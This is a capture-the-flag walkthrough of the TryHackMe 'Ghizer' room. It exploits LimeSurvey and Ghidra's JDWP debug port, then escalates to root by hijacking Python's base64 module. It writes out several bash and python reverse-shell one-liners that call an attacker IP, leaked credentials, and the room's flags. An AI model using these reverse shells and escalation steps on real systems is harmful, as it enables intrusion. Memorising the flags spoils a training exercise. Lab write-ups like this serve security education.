# Tryhackme.com Room : Ghizer
`https://tryhackme.com/room/ghizerctf`


# Instance
```
export IP=10.10.89.94
```

# Nmap
```
21/tcp  open  ftp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
|     Please login with USER and PASS.
|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: B55AD3F0C0A029568074402CE92ACA23
|_http-generator: LimeSurvey http://www.limesurvey.org
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         LimeSurvey    
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.4.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ghizer &#8211; Just another WordPress site
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-23T17:27:31
| Not valid after:  2030-07-21T17:27:31
| MD5:   afb1 a2b9 1183 2e49 f707 9d1a 7198 9ca3
|_SHA-1: 37f1 945f 6bc4 3fad 3f0f ca8d 3788 2c17 cc25 0792
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

So we got a `limesurvey` server running on port `80` and a wordpress blog on `443`.

There is also an `ftp` server running. The header says that it's an `anonymous` ftp server but we can't login with `anonymous` user (Password required)

On the wordpress site we see :
```
Welcome to my WordPress antihackers!

I use the plugin WPS Hide Login for hide wp-login!

try harder!

? it’s very important :3333
```

This comment is written by `Anny`

We ran `gobuster` on both ports.

Port `443`:
```
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-admin (Status: 301)
/server-status (Status: 403)
```

Port `80`:
```
/docs (Status: 301)
/themes (Status: 301)
/admin (Status: 301)
/assets (Status: 301)
/upload (Status: 301)
/tests (Status: 301)
/plugins (Status: 301)
/application (Status: 301)
/tmp (Status: 301)
/framework (Status: 301)
/locale (Status: 301)
/installer (Status: 301)
/third_party (Status: 301)
/server-status (Status: 403)
```

by browsing `/docs/release_notes.txt` we get the version of `limesurvey`:
```
3.15.9
```

By running `/installer/create-database.php` we reset the admin password to
```
admin:password
```

Or were they already that ? Didn't check before. Anyhow, now we are in `limesurvey`.

Looking at `searchsploit` I found `php/webapps/46634.py`.

And running that we got a shell as `www-data`

For some reason, we can't stabilize a shell with python or stty raw -echo.
Also, we can't move out of `/var/www/html/limesurvey`
Can't spawn a python shell.
I don't see `stderr`

We cant still run commands tho. Listing `../wordpress` we find `wp-config.php` which contains the db logins :
```
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password' );
```

By poking around, I might have found how to get to `root` once we get acess to `veronica` account.

There is a file `cat /home/veronica/base.py`
```
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)
```

So i'm guessing we need to inject ourselve before `base64` module

Let's try a reverse shell to get rid of this annoying shell
```
python -c "import os; os.system('bash -i >& /dev/tcp/10.6.32.20/5555 0>&1')"
```

Hmmm nop..

Let's get back to `base.py`

With `python -c "import base64; print base64.__file__"`
We find from where `base64` is launched
```
/usr/lib/python2.7/base64.pyc
```

We list the python paths `python -c 'import sys; print sys.path'`
```
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
```

So this is basically in the first path. Maybe we can inject with `PYTHONPATH` env variable ?

Couldn't set `PYTHONPATH` using export,  used `env` command :
```
env PYTHONPATH=/var/www/html/limesurvey/py python /home/veronica/base.py
```

And we get injection. Although, this is useless unless it is runned as another user..

Soo, was annoyed by the limited shell so I tried another revshell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And it worked :)

So now we can look at the wordpress database.
We find this in users
```
 1 | Anny       | $P$BJImLXNua3oNCoX7gSXEvWkHxuz.K9. | anny          | ghizer@thm.com | https://192.168.85.128 | 2020-07-23 22:46:47 |                     |           0 | Anny
 ```

 Maybe we can crack the password ? Might be the same as `veronica` ?

In wp-config, maybe we can reach the wordpress admin login ? What would that give us ? We still be `www-data`
```
(156,'whl_redirect_admin','404','yes'),
```

Fresh session after about a week.

Poking around looking at the files on port `80` I found some credentials in `/var/www/html/limesurvey/application/config/config.php`:
```
'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
                        'emulatePrepare' => true,
                        'username' => 'Anny',
                        'password' => 'P4$W0RD!!#S3CUr3!',
                        'charset' => 'utf8mb4',
                        'tablePrefix' => 'lime_',
```

This give us the answer for the first question :
```
Anny:P4$W0RD!!#S3CUr3!
```

Also found a backdoor directly on the server `http://$IP/shell.php?c=CMD`. Didn't use it to get in tho.


Now let's try to find the url for the login page.

Connecting to the db using `mysql -u wordpressuser -p` then `use wordpress;`

We get the path with `select * from wp_options where option_name = "whl_page";`
```
+-----------+-------------+--------------+----------+
| option_id | option_name | option_value | autoload |
+-----------+-------------+--------------+----------+
|       155 | whl_page    | devtools     | yes      |
+-----------+-------------+--------------+----------+
```

Hmmm.. Let's continue with our escalation of the box.

We see that `veronica` is running `Ghidra`
```
veronica  1730  0.0  0.1  12532  2892 ?        S    20:21   0:00 /bin/bash /home/veronica/ghidra_9.0/support/ghidraDebug
veronica  1739  0.0  0.1  12584  3132 ?        S    20:21   0:00 /bin/bash /home/veronica/ghidra_9.0/support/launch.sh debug Ghidra   ghidra.GhidraRun
```

Found this exploit `https://web.archive.org/web/20190306002449/https://static.hacker.house/releasez/expl0itz/jdwp-exploit.txt`


Seems like we can't execute a reverse shell from there. Something to do with how java handle quote & stuff. We first write our revshell to a bash script :
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.6.32.20/6666 0>&1
```

Then
```
jdb -attach 127.0.0.1:18001
trace go methods
untrace
stop in org.apache.logging.log4j.core.util.WatchManager$FileMonitor.access$300
WAIT FOR BREAKPOINT...
print new java.lang.Runtime().exec("/dev/shm/revshell.sh")
```

And we get a revshell to `veronica`

We find `user.txt`
```
THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
```

In the home, there is that suspicious `base.py` file that ask to be injected.
In `/etc/crontab` we have:
```
*  *    * * *   root    cd /root/Lucrecia && bash lucre.sh
```

Maybe the `lucre.sh` script call python and we can inject ourselves in there ?

Oh wellll, way easier than that. The output of `sudo -l` :
```
 (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
```

Let's just inject ourself another revshell in base.py and we are good to go !

To do so, we simply create a `base64` folder in `/home/veronica` and create a `__init__.py` file with the following content :
```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

We then get a root shell and retrieve the flag :

Root.txt :
```
THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
```

